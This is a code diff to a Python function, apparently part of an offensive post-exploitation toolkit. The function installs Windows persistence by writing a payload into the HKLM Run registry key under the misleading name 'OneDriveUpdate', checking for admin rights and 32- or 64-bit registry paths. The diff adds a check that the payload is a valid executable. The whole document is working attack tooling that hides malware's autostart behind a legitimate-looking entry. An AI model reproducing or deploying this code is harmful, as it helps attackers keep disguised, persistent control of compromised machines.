@@ -25,21 +25,25 @@ def reg_create(path,name,payload):
 		return True
 
 def hklm_run(payload):
-	if (information().admin() == True):
-		if ("64" in information().architecture()):
-			if (reg_create("Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run","OneDriveUpdate",payload) == True):
-				print_success("Successfully created OneDriveUpdate key containing payload ({})".format(os.path.join(payload)))
-				print_success("Successfully installed persistence, payload will run at login")
+	if (payloads().exe(payload) == True):
+		if (information().admin() == True):
+			if ("64" in information().architecture()):
+				if (reg_create("Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run","OneDriveUpdate",payload) == True):
+					print_success("Successfully created OneDriveUpdate key containing payload ({})".format(os.path.join(payload)))
+					print_success("Successfully installed persistence, payload will run at login")
+				else:
+					print_error("Unable to install persistence")
+					return False
 			else:
-				print_error("Unable to install persistence")
-				return False
+				if (reg_create("Software\Microsoft\Windows\CurrentVersion\Run","OneDriveUpdate",payload) == True):
+					print_success("Successfully created OneDriveUpdate key containing payload ({})".format(os.path.join(payload)))
+					print_success("Successfully installed persistence, payload will run at login")
+				else:
+					print_error("Unable to install persistence")
+					return False
 		else:
-			if (reg_create("Software\Microsoft\Windows\CurrentVersion\Run","OneDriveUpdate",payload) == True):
-				print_success("Successfully created OneDriveUpdate key containing payload ({})".format(os.path.join(payload)))
-				print_success("Successfully installed persistence, payload will run at login")
-			else:
-				print_error("Unable to install persistence")
-				return False
+			print_error("Cannot proceed, we are not elevated")
+			return False
 	else:
-		print_error("Cannot proceed, we are not elevated")
-		return False
+		print_error("Cannot proceed, invalid payload")
+		return False				
